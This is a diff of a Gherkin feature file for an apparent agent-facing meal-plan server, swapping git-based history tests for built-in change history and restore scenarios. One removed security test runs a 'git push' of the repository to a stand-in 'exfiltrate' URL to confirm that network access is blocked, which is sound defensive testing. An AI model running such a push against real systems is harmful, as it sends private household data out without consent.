@@ -1,26 +1,27 @@
 @core
 Feature: The meal plan remembers what it used to say
   As a busy housewife whose recipes have been collected over years
-  I want every change to the folder kept in history
-  So that an agent editing a file freehand can never lose Grandma's tortilla trick
+  I want every change to the meal plan kept in history
+  So that an agent editing a document freehand can never lose Grandma's tortilla trick
 
-  The mounted folder is a git repository. Nothing about that is exposed as a
-  concept the housewife has to learn: the server commits after every mutating
-  tool call, with the message the agent provides. git log, git diff and
-  git restore all work, so history accumulates whether or not the agent thinks
-  to ask for it. What the agent gets in return is a way back — the undo button
-  that a folder of files otherwise does not have.
+  Every change is recorded: the server records each write, edit and delete
+  with the message the agent provides, and the documents each change touched.
+  Nothing about that is a concept the housewife has to learn, and nothing the
+  agent has to remember to do. What the agent gets in return is a way back —
+  history lists the changes, and restore_file puts any document back as it
+  was after any of them (ADR 0038). It replaces the git repository the folder
+  was, and the git commands that went with it.
 
   Background:
-    Given a meal-plan folder mounted at "/workspace"
+    Given a meal plan
 
-  Scenario: The folder is a repository from the very first mount
-    Given the meal-plan folder is brand new
-    When I run "git log --oneline"
+  Scenario: A brand new meal plan already has its first change
+    Given the meal plan is brand new
+    When I look at the history
     Then the command succeeds
-    And the output says the folder was initialised
+    And the output mentions "scaffold README.md"
 
-  Scenario: Writing a file commits it
+  Scenario: Writing a document records it
     When I write the file "recipes/chicken-tacos.md":
       """
       ---
@@ -32,79 +33,51 @@ Feature: The meal plan remembers what it used to say
 
       - 12 corn tortillas
       """
-    And I run "git status --porcelain"
-    Then the output is empty
+    Then the last change touched "recipes/chicken-tacos.md"
 
-  Scenario: A command that changes files commits what it changed
+  Scenario: An edit records what it changed
     Given I have recorded the recipe "Chicken Tacos" serving 4
-    When I run "sed -i 's/^servings: 4$/servings: 6/' recipes/chicken-tacos.md"
-    And I run "git status --porcelain"
-    Then the output is empty
-    And the last commit touched the file "recipes/chicken-tacos.md"
+    When I edit "recipes/chicken-tacos.md" replacing "servings: 4" with "servings: 6"
+    Then the last change touched "recipes/chicken-tacos.md"
 
-  Scenario: Scaffolding added to an existing folder commits itself
+  Scenario: Scaffolding put back on a later start records itself
     Given I have recorded the recipe "Chicken Tacos" serving 4
-    And I have run "rm preferences/household.md"
+    And I have deleted the document "preferences/household.md" with the message "Tidy up"
     When the server restarts
-    And I run "git status --porcelain"
-    Then the output is empty
-
-  Scenario: The scaffolding commit says what it put back
-    Given I have run "rm preferences/household.md" with the message "Tidy up"
-    When the server restarts
-    And I run "git log -1 --format=%s"
-    Then the output mentions "preferences/household.md"
+    Then the last change is named "scaffold preferences/household.md"
 
   Scenario: A restart that scaffolds nothing does not clutter the history
     Given I have recorded the recipe "Chicken Tacos" serving 4
-    And the history has 4 commits
+    And the history has 2 changes
     When the server restarts
-    Then the history has 4 commits
+    Then the history has 2 changes
 
-  Scenario: A command that changes nothing does not clutter the history
+  Scenario: Reading changes nothing, so it does not clutter the history
     Given I have recorded the recipe "Chicken Tacos" serving 4
-    And the history has 4 commits
-    When I run "grep -r tortillas recipes/"
-    Then the history has 4 commits
+    And the history has 2 changes
+    When I search "recipes" for "tortillas"
+    Then the history has 2 changes
 
-  Scenario: Several files changed by one command land in one commit
+  Scenario: A write that changes nothing does not clutter the history
     Given I have recorded the recipe "Chicken Tacos" serving 4
-    And I have planned dinner on "2026-08-25" with the recipe "Chicken Tacos"
-    And the history has 5 commits
-    When I run:
-      """
-      mv recipes/chicken-tacos.md recipes/taco-night.md
-      sed -i 's|chicken-tacos|taco-night|; s|Chicken Tacos|Taco Night|' meals/2026-08-25.md
-      sed -i 's|^name: Chicken Tacos$|name: Taco Night|' recipes/taco-night.md
-      """
-    Then the history has 6 commits
-    And the last commit touched the file "recipes/taco-night.md"
-    And the last commit touched the file "meals/2026-08-25.md"
+    And the history has 2 changes
+    When I record the recipe "Chicken Tacos" serving 4
+    Then the history has 2 changes
 
-  Scenario: The commit message is what the agent provided
+  Scenario: The change is named with what the agent provided
     Given I have recorded the recipe "Chicken Tacos" serving 4
-    When I run "sed -i 's/^servings: 4$/servings: 6/' recipes/chicken-tacos.md" with the message "Double the chicken tacos"
-    And I run "git log -1 --format=%s"
-    Then the output is "Double the chicken tacos"
+    When I edit "recipes/chicken-tacos.md" replacing "servings: 4" with "servings: 6" with the message "Double the chicken tacos"
+    Then the last change is named "Double the chicken tacos"
 
   Scenario: Reading the history of one recipe
     Given the recipe "Chicken Tacos" has been edited on:
       | date       |
       | 2026-07-04 |
       | 2026-08-10 |
-    When I run "git log --format=%ad --date=short -- recipes/chicken-tacos.md"
-    Then the output is:
-      """
-      2026-08-10
-      2026-07-04
-      """
-
-  Scenario: Seeing what an edit actually changed
-    Given I have recorded the recipe "Chicken Tacos" serving 4
-    When I run "sed -i 's/^servings: 4$/servings: 6/' recipes/chicken-tacos.md"
-    And I run "git diff HEAD~1 -- recipes/chicken-tacos.md"
-    Then the output contains the line "-servings: 4"
-    And the output contains the line "+servings: 6"
+    When I look at the history of "recipes/chicken-tacos.md"
+    Then the changes listed are dated, newest first:
+      | 2026-08-10 |
+      | 2026-07-04 |
 
   Scenario: Recovering a recipe an agent overwrote
     Given the file "recipes/chicken-tacos.md" contains:
@@ -122,43 +95,46 @@ Feature: The meal plan remembers what it used to say
 
       Grandma's trick: warm the tortillas in a dry skillet, never the microwave.
       """
-    And I have run:
+    And I have written the file "recipes/chicken-tacos.md":
       """
-      cat > recipes/chicken-tacos.md <<'EOF'
       ---
       name: Chicken Tacos
       servings: 4
       ---
-      EOF
       """
-    When I run "git restore --source=HEAD~1 recipes/chicken-tacos.md"
+    When I restore "recipes/chicken-tacos.md" as it was before the last change
     Then the command succeeds
     And the file "recipes/chicken-tacos.md" contains the line "Grandma's trick: warm the tortillas in a dry skillet, never the microwave."
 
   Scenario: Recovering a recipe an agent deleted
     Given I have recorded the recipe "Chicken Tacos" serving 4
-    And I have run "rm recipes/chicken-tacos.md"
-    When I run "git restore --source=HEAD~1 recipes/chicken-tacos.md"
+    And I have deleted the document "recipes/chicken-tacos.md"
+    When I restore "recipes/chicken-tacos.md" as it was before it was deleted
     Then the command succeeds
     And the recipe "Chicken Tacos" serves 4
 
-  Scenario: Undoing a whole week of planning
-    Given I have planned the days:
+  Scenario: Undoing a day of planning
+    Restoring a document to a change from before it existed deletes it: the
+    meal plan is then exactly as it was.
+
+    Given I have recorded the recipe "Chicken Tacos" serving 4
+    And I have planned the days:
       | date       | recipes       |
       | 2026-08-24 | Chicken Tacos |
       | 2026-08-25 | Chicken Tacos |
-    When I run "git revert --no-edit HEAD"
+    When I restore "meals/2026-08-25.md" as it was before it was written
     Then the command succeeds
-    And the file "meals/2026-08-25.md" does not exist in the meal-plan folder
+    And the file "meals/2026-08-25.md" does not exist in the meal plan
+    And the file "meals/2026-08-24.md" exists in the meal plan
 
-  Scenario: An invalid document is still committed, so it can still be recovered from
+  Scenario: An invalid document is never stored, so there is nothing broken to recover from
     When I write the file "recipes/broken.md":
       """
       no front matter here
       """
-    And I run "mealplan validate"
     Then the command fails
-    And the file "recipes/broken.md" is committed
+    And the file "recipes/broken.md" does not exist in the meal plan
+    And the history has 1 change
 
   @remembers-commit-count
   Scenario: History is not a chore the agent has to remember
@@ -173,17 +149,14 @@ Feature: The meal plan remembers what it used to say
 
       - 3 eggs
       """
-    Then the history has 1 more commit than before
-    And I never ran a git command
+    Then the history has 1 more change than before
 
   @security
-  Scenario: History cannot be pushed anywhere
-    Given I have recorded the recipe "Chicken Tacos" serving 4
-    When I run "git push https://example.com/exfiltrate.git HEAD"
-    Then the command fails
-    And the error output explains that network access is not allowed
-
-  @security
-  Scenario: The repository has no remote to leak to
-    When I run "git remote -v"
-    Then the output is empty
+  Scenario: One household's history is not another's
+    Given another household's meal plan holds the document "recipes/secret-stew.md":
+      """
+      # Secret Stew
+      """
+    When I look at the history
+    Then the output does not contain "secret-stew"
+    And the output does not contain "theirs"
